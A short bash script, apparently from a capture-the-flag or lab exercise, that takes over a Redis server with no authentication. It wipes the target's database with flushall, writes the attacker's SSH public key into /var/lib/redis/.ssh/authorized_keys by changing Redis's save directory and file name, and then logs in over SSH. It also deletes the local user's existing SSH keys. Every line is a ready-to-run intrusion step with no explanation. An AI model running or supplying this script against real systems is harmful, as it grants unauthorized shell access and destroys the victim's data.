#!/bin/bash

rm ~/.ssh/id*
ssh-keygen -t rsa

(echo -e "\n\n";cat ~/.ssh/id_rsa.pub;echo -e "\n\n")>foo.txt

redis-cli -h 10.10.10.160 flushall
cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit
redis-cli -h 10.10.10.160 config set dir /var/lib/redis/.ssh/
redis-cli -h 10.10.10.160 config set dbfilename "authorized_keys"
redis-cli -h 10.10.10.160 save

ssh -i ~/.ssh/id_rsa redis@10.10.10.160
